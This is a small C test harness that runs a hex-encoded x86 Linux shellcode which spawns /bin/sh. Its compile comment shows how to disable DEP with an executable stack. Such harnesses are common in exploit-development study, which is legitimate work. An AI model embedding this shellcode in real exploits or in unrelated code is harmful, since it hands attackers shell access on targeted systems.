/* compile:
   gcc -z execstack -m32 -o testshellcode testshellcode.c 

   -z execstack -> Disable DEP
*/


char shellcode[] = "\x31\xc0\x50\xeb\x0e\x8b\x1c\x24\x88\x43\x07\x89\xe1\x31\xd2\xb0"
                   "\x0b\xcd\x80\xe8\xed\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x30";

int main() {
   void (*shell)() = (void*)shellcode;
   shell();

   return 0;
}
